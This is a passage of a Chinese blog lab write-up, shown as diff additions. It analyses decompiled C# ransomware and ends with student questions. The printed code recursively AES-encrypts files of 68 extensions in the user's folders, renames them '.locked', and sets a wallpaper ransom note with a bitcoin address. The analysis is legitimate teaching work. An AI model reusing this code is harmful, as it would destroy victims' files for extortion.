class="hljs-number">09</span>     <span class="hljs-built_in">string</span> location7 = userDir + str + userName + <span class="hljs-string">&quot;\\Pictures&quot;</span>;<br><span class="hljs-number">10</span>     <span class="hljs-built_in">string</span> location8 = userDir + str + userName + <span class="hljs-string">&quot;\\Music&quot;</span>;<br><span class="hljs-number">11</span>     <span class="hljs-built_in">string</span> location9 = userDir + str + userName + <span class="hljs-string">&quot;\\OneDrive&quot;</span>;<br><span class="hljs-number">12</span>     <span class="hljs-built_in">string</span> location10 = userDir + str + userName + <span class="hljs-string">&quot;\\Saved Games&quot;</span>;<br><span class="hljs-number">13</span>     <span class="hljs-built_in">string</span> location11 = userDir + str + userName + <span class="hljs-string">&quot;\\Favorites&quot;</span>;<br><span class="hljs-number">14</span>     <span class="hljs-built_in">string</span> location12 = userDir + str + userName + <span class="hljs-string">&quot;\\Searches&quot;</span>;<br><span class="hljs-number">15</span>     <span class="hljs-built_in">string</span> location13 = userDir + str + userName + <span class="hljs-string">&quot;\\Videos&quot;</span>;<br><span class="hljs-number">16</span>     encryptDirectory(location, password);<br><span class="hljs-number">17</span>     encryptDirectory(location2, password);<br><span class="hljs-number">18</span>     encryptDirectory(location3, password);<br><span class="hljs-number">19</span>     encryptDirectory(location4, password);<br><span class="hljs-number">20</span>     encryptDirectory(location5, password);<br><span class="hljs-number">21</span>     encryptDirectory(location6, password);<br><span class="hljs-number">22</span>     encryptDirectory(location7, password);<br><span class="hljs-number">23</span>     encryptDirectory(location8, password);<br><span class="hljs-number">24</span>     encryptDirectory(location9, password);<br><span class="hljs-number">25</span>     encryptDirectory(location10, password);<br><span class="hljs-number">26</span>     encryptDirectory(location11, password);<br><span class="hljs-number">27</span>     encryptDirectory(location12, password);<br><span class="hljs-number">28</span>     encryptDirectory(location13, password);<br><span class="hljs-number">29</span> &#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>目录加密是在Directory_Settings_Sending方法中实现的，通过代码可以看出恶意代码主要是对用户的一些典型的资料保存的文件路径进行加密，例如桌面，图片文件夹，我的文档，音乐，视频等。具体加密的代码在encryptDirectory方法中实现。</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c#"><br><span class="hljs-number">01</span> <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">encryptDirectory</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> location, <span class="hljs-built_in">string</span> password</span>)</span> &#123;<br><span class="hljs-number">02</span>     <span class="hljs-keyword">try</span> &#123;<br><span class="hljs-number">03</span>         <span class="hljs-built_in">string</span>[] source = <span class="hljs-keyword">new</span> <span class="hljs-built_in">string</span>[<span class="hljs-number">68</span>] &#123;<br><span class="hljs-number">04</span><span class="hljs-string">&quot;.txt&quot;</span>,<span class="hljs-string">&quot;.jar&quot;</span>,<span class="hljs-string">&quot;.exe&quot;</span>,<span class="hljs-string">&quot;.dat&quot;</span>,<span class="hljs-string">&quot;.contact&quot;</span>,<span class="hljs-string">&quot;.settings&quot;</span>,<span class="hljs-string">&quot;.doc&quot;</span>,<span class="hljs-string">&quot;.docx&quot;</span>,<span class="hljs-string">&quot;.xls&quot;</span>,<span class="hljs-string">&quot;.xlsx&quot;</span>,<span class="hljs-string">&quot;.ppt&quot;</span>,<span class="hljs-string">&quot;.pptx&quot;</span>,<span class="hljs-string">&quot;.odt&quot;</span>,<span class="hljs-string">&quot;.jpg&quot;</span>,<span class="hljs-string">&quot;.png&quot;</span>,<span class="hljs-string">&quot;.csv&quot;</span>,<span class="hljs-string">&quot;.py&quot;</span>,<span class="hljs-string">&quot;.sql&quot;</span>,<span class="hljs-string">&quot;.mdb&quot;</span>,<span class="hljs-string">&quot;.sln&quot;</span>,<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.xml&quot;</span>,<span class="hljs-string">&quot;.psd&quot;</span>,<span class="hljs-string">&quot;.pdf&quot;</span>,<span class="hljs-string">&quot;.dll&quot;</span>,<span class="hljs-string">&quot;.c&quot;</span>,<span class="hljs-string">&quot;.cs&quot;</span>,<span class="hljs-string">&quot;.mp3&quot;</span>,<span class="hljs-string">&quot;.mp4&quot;</span>,<span class="hljs-string">&quot;.f3d&quot;</span>,<span class="hljs-string">&quot;.dwg&quot;</span>,<span class="hljs-string">&quot;.cpp&quot;</span>,<span class="hljs-string">&quot;.zip&quot;</span>,<span class="hljs-string">&quot;.rar&quot;</span>,<span class="hljs-string">&quot;.mov&quot;</span>,<span class="hljs-string">&quot;.rtf&quot;</span>,<span class="hljs-string">&quot;.bmp&quot;</span>,<span class="hljs-string">&quot;.mkv&quot;</span>,<span class="hljs-string">&quot;.avi&quot;</span>,<span class="hljs-string">&quot;.apk&quot;</span>,<span class="hljs-string">&quot;.lnk&quot;</span>,<span class="hljs-string">&quot;.iso&quot;</span>,<span class="hljs-string">&quot;.7-zip&quot;</span>,<span class="hljs-string">&quot;.ace&quot;</span>,<span class="hljs-string">&quot;.arj&quot;</span>,<span class="hljs-string">&quot;.bz2&quot;</span>,<span class="hljs-string">&quot;.cab&quot;</span>,<span class="hljs-string">&quot;.gzip&quot;</span>,<span class="hljs-string">&quot;.lzh&quot;</span>,<span class="hljs-string">&quot;.tar&quot;</span>,<span class="hljs-string">&quot;.uue&quot;</span>,<span class="hljs-string">&quot;.xz&quot;</span>,<span class="hljs-string">&quot;.z&quot;</span>,<span class="hljs-string">&quot;.001&quot;</span>,<span class="hljs-string">&quot;.mpeg&quot;</span>,<span class="hljs-string">&quot;.mp3&quot;</span>,<span class="hljs-string">&quot;.mpg&quot;</span>,<span class="hljs-string">&quot;.core&quot;</span>,<span class="hljs-string">&quot;.crproj&quot;</span>,<span class="hljs-string">&quot;.pdb&quot;</span>,<span class="hljs-string">&quot;.ico&quot;</span>,<span class="hljs-string">&quot;.pas&quot;</span>,<span class="hljs-string">&quot;.db&quot;</span>,<span class="hljs-string">&quot;.torrent&quot;</span><br><span class="hljs-number">05</span>         &#125;;<br><span class="hljs-number">06</span>         <span class="hljs-built_in">string</span>[] files = Directory.GetFiles(location);<br><span class="hljs-number">07</span>         <span class="hljs-built_in">string</span>[] directories = Directory.GetDirectories(location);<br><span class="hljs-number">08</span>         <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; files.Length; i++) &#123;<br><span class="hljs-number">09</span>             <span class="hljs-built_in">string</span> extension = Path.GetExtension(files[i]);<br><span class="hljs-number">10</span>             <span class="hljs-keyword">if</span> (source.Contains(extension)) &#123;<br><span class="hljs-number">11</span>                 EncryptFile(files[i], password);<br><span class="hljs-number">12</span>             &#125;<br><span class="hljs-number">13</span>         &#125;<br><span class="hljs-number">14</span>         <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> j = <span class="hljs-number">0</span>; j &lt; directories.Length; j++) &#123;<br><span class="hljs-number">15</span>             encryptDirectory(directories[j], password);<br><span class="hljs-number">16</span>         &#125;<br><span class="hljs-number">17</span>     &#125; <span class="hljs-keyword">catch</span> (Exception) &#123;<br><span class="hljs-number">18</span>     &#125;<br><span class="hljs-number">19</span> &#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>以上的代码中可以分析出，恶意代码仅对指定的文件类型进行加密，主要是各类文档，程序代码和数据文件。以上加密过程中，还调用了EncryptFile方法对文件加密，代码如下：</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c#"><br><span class="hljs-number">01</span> <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">EncryptFile</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> file, <span class="hljs-built_in">string</span> password</span>)</span> &#123;<br><span class="hljs-number">02</span>     <span class="hljs-built_in">byte</span>[] bytesToBeEncrypted = File.ReadAllBytes(file);<br><span class="hljs-number">03</span>     <span class="hljs-built_in">byte</span>[] bytes = Encoding.UTF8.GetBytes(password);<br><span class="hljs-number">04</span>     bytes = SHA256.Create().ComputeHash(bytes);<br><span class="hljs-number">05</span>     <span class="hljs-built_in">byte</span>[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);<br><span class="hljs-number">06</span>     <span class="hljs-built_in">string</span> str = <span class="hljs-string">&quot;Users\\&quot;</span>;<br><span class="hljs-number">07</span>     <span class="hljs-built_in">string</span> str2 = str + userName + <span class="hljs-string">&quot;\\Desktop\\READ_IT.txt.locked&quot;</span>;<br><span class="hljs-number">08</span>     <span class="hljs-built_in">string</span> path = userDir + str2;<br><span class="hljs-number">09</span>     <span class="hljs-keyword">if</span> (File.Exists(path)) &#123;<br><span class="hljs-number">10</span>         File.Delete(path);<br><span class="hljs-number">11</span>     &#125;<br><span class="hljs-number">12</span>     File.WriteAllBytes(file, bytes2);<br><span class="hljs-number">13</span>     File.Move(file, file + <span class="hljs-string">&quot;.locked&quot;</span>);<br><span class="hljs-number">14</span> &#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>对以上的代码分析，可以发现恶意代码将文件进行加密，然后增加”.locked”文件名后缀。</p>
+<p>这里请读者分析全部代码后解释其中6-11行代码意义是什么？特别是第10行代码是否会执行？</p>
+<p>以上代码中，最终调用了AES_Encrypt方法对文件内容进行加密，这是典型的库函数调用加密过程代码，这里就不进行分析了。</p>
+<h4 id="4-3-4-创建勒索信息"><a href="#4-3-4-创建勒索信息" class="headerlink" title="4.3.4 创建勒索信息"></a>4.3.4 创建勒索信息</h4><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c#"><br><span class="hljs-number">01</span> <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">CreateWallpaper</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> path</span>)</span> &#123;<br><span class="hljs-number">02</span>     <span class="hljs-keyword">try</span> &#123;<br><span class="hljs-number">03</span>         <span class="hljs-built_in">string</span> text = Create(<span class="hljs-number">17</span>);<br><span class="hljs-number">04</span>         <span class="hljs-built_in">string</span> s = <span class="hljs-string">&quot;All your files are encrypted with RSA-2048 and AES-128 cipher&quot;</span> + Environment.NewLine + <span class="hljs-string">&quot;More information about RSA and AES can be found here:&quot;</span> + Environment.NewLine + <span class="hljs-string">&quot;https://en.wikipedia.org/wiki/RSA_(cryptosystem)&quot;</span> + Environment.NewLine + <span class="hljs-string">&quot;https://en.wikipedia.org/wiki/Advanced_Encryption_Standard&quot;</span> + Environment.NewLine + Environment.NewLine + <span class="hljs-string">&quot;In order to decrypt your files you need to follow these steps&quot;</span> + Environment.NewLine + <span class="hljs-string">&quot;1) buy bitcoins https://cex.io/buy-bitcoins&quot;</span> + Environment.NewLine + <span class="hljs-string">&quot;2) send 0.055 BTC to&quot;</span> + Environment.NewLine + <span class="hljs-string">&quot;32CCbV3wMs4kRo8vZ9GuusgzZh4D5GdkUo&quot;</span> + Environment.NewLine + <span class="hljs-string">&quot;3) Perform a payment&quot;</span> + Environment.NewLine + Environment.NewLine + <span class="hljs-string">&quot;Your personal identification ID: &quot;</span> + text;<br><span class="hljs-number">05</span>         Bitmap bitmap = <span class="hljs-keyword">new</span> Bitmap(pictureBox1.Width, pictureBox1.Height);<br><span class="hljs-number">06</span>         Font font = <span class="hljs-keyword">new</span> Font(<span class="hljs-string">&quot;TimesNewRoman&quot;</span>, <span class="hljs-number">25f</span>, FontStyle.Regular, GraphicsUnit.Pixel);<br><span class="hljs-number">07</span>         Graphics graphics = Graphics.FromImage(bitmap);<br><span class="hljs-number">08</span>         graphics.DrawString(s, font, Brushes.Tomato, <span class="hljs-keyword">new</span> Point(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>));<br><span class="hljs-number">09</span>         bitmap.Save(path);<br><span class="hljs-number">10</span>         SetWallpaper(path);<br><span class="hljs-number">11</span>     &#125; <span class="hljs-keyword">catch</span> (Exception) &#123;<br><span class="hljs-number">12</span>     &#125;<br><span class="hljs-number">13</span> &#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>以上代码分析可以得知其主要功能是构建勒索信息，将比特币转账地址，价格等信息制作成图片，然后设置为用户的桌面显示给用户。</p>
+<p>至此，一个完成的勒索病毒的功能都分析完毕。由于是使用C#编写，且没有对代码进行混淆处理，直接使用逆向分析工具就能获得源码进行分析，相对比较的简单，并且从病毒作者的编码错误可以推断水平不高，制作较为粗糙。但整体作为一款勒索软件，具备了相关的基本要素。 </p>
+<h2 id="5-实验结果："><a href="#5-实验结果：" class="headerlink" title="5. 实验结果："></a>5. 实验结果：</h2><ol>
+<li><p>请简要说明恶意代码的主要执行流程。</p>
+</li>
+<li><p>请指出恶意代码破坏的用户目录文件位置，破坏文件类型？</p>
+</li>
+<li><p>请指出恶意代码是如何发送用户密码等信息的？其目的是什么？</p>
+</li>
+<li><p>其他实验问题及结论：</p>
+</li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>勒索病毒程序分析</div>
+      <div>http://example.com/2024/10/24/111/勒索病毒程序分析/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Re1ca1g</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年10月24日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/10/24/111/%E4%BD%BF%E7%94%A8%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%99%A8%E5%88%86%E6%9E%90WinRAR%E8%BD%AF%E4%BB%B6%E3%80%90x64dbg%E3%80%91/" title="使用动态调试器分析WinRAR软件【x64dbg】">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">使用动态调试器分析WinRAR软件【x64dbg】</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/10/24/111/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%A8%8B%E5%BA%8F%E8%A1%A5%E4%B8%81%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E4%BF%AE%E6%94%B9%E8%BD%AF%E4%BB%B6%E6%97%B6%E9%97%B4%E9%99%90%E5%88%B6/" title="二进制程序补丁实验——修改软件时间限制">
+                        <span class="hidden-mobile">二进制程序补丁实验——修改软件时间限制</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    
+
+<div class="text-center py-1">   
+  <div>
+    <span>Copyright © 2023</span></a>
+    <a href="https://reicalg2003.github.io" target="_blank" rel="nofollow noopener">
+     <span>Re1ca1g‘s Blog</span></a>    <br>
+</div>
+
+<div style="line-height: 100px;text-align: center;margin:auto;width: 500px;height: 50px">
+  <span id="timeDate">载入天数...</span>
+  <span id="times">载入时分秒...</span>
+  <script>
+  var now = new Date();
+  function createtime(){
+      var grt= new Date("02/09/2018 00:00:00");//此处修改你的建站时间或者网站上线时间
+      now.setTime(now.getTime()+250);
+      days = (now - grt ) / 1000 / 60 / 60 / 24;
+      dnum = Math.floor(days);
+      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+      hnum = Math.floor(hours);
+      if(String(hnum).length ==1 ){
+          hnum = "0" + hnum;
+      }
+      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+      mnum = Math.floor(minutes);
+      if(String(mnum).length ==1 ){
+                mnum = "0" + mnum;
+      }
+      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+      snum = Math.round(seconds);
+      if(String(snum).length ==1 ){
+                snum = "0" + snum;
+      }
+      document.getElementById("timeDate").innerHTML = "❤ for&nbsp"+dnum+"&nbspdays";  //此次自定义显示内容
+      document.getElementById("times").innerHTML = hnum + "&nbsphr&nbsp" + mnum + "&nbspmin&nbsp" + snum + "&nbspsec";
+  }  //此次自定义显示内容
+  setInterval("createtime()",250);
+  </script>
+</div>
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/DynamicLine.js"></script>
+<script src="/js/yinghua.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/gradient.css.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
